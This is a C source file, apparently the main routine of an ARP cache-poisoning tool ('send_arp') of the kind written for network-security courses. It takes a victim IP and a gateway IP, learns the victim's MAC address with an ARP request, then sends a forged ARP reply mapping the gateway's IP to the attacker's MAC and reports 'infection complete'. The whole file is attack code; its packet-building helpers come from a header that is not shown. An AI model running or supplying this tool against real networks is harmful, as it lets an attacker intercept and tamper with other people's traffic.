#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include "send_arp.h"

void usage(void) {
    printf("Usage : ./send_arp <interface> <sender(victim) ip> <target(gateway) ip>\n");
    printf("sample: ./send_arp wlan0 192.168.10.2 192.168.10.1\n");
    exit(0);
}

/*
1. get my mac, ip
2. send arp req to victim
3. recv arp rep from victim (by parsing ethertype, srcaddr)
    -> then i know the mac addr of victim 
4. send arp rep to victim (src mac == mine, src ip == gateway, )
*/

int main(int argc, char * argv[]) {
    if (argc != 4)                // sender ip & target ip have to be paired. || max == 100 pairs
        usage();    

    const char * dev = argv[1];
                                     // interface name
    uint8_t sender_ip[4];
    str_to_ip(sender_ip, argv[2]);
    uint8_t receiver_ip[4];
    str_to_ip(receiver_ip, argv[3]);

    uint8_t my_mac[6];
    get_mac(my_mac, dev);
    uint8_t my_ip[4];
    get_ip(my_ip, dev);

    uint8_t sender_mac[6];
    uint8_t receiver_mac[6];

    u_char * hdr_buf;
    u_char * payload_buf;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t * handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    printf("=========================================================\n");
    printf("\n[+] 1. Send ARP request packet. Who is [victim's ip]\n\n");
    send_ARP_req(my_mac, my_ip, sender_ip, handle);
    printf("\n[+] Success - 1\n\n");
    
    printf("*********************************************************\n");
    printf("\n[+] 2. Receive ARP reply packet from victim\n\n");
    recv_ARP_rep(sender_ip, sender_mac, handle);
    
    printf("\n");
    printf("sender's mac : ");
    for(int i=0; i<6; i++) {
        printf("%02X", sender_mac[i]);
        if (i == 5) printf("\n");
        else printf(":");
    }

    printf("\n[+] Success - 2\n\n");

    printf("*********************************************************\n");
    printf("\n[+] 3. Send fake ARP reply packet to victim \n\n");
    send_fake_ARP_rep(sender_mac, sender_ip, my_mac, receiver_ip, handle);
    printf("\n[+] Success - 3\n\n");
    
    printf("[+] infection complete\n");
    return 0;
}


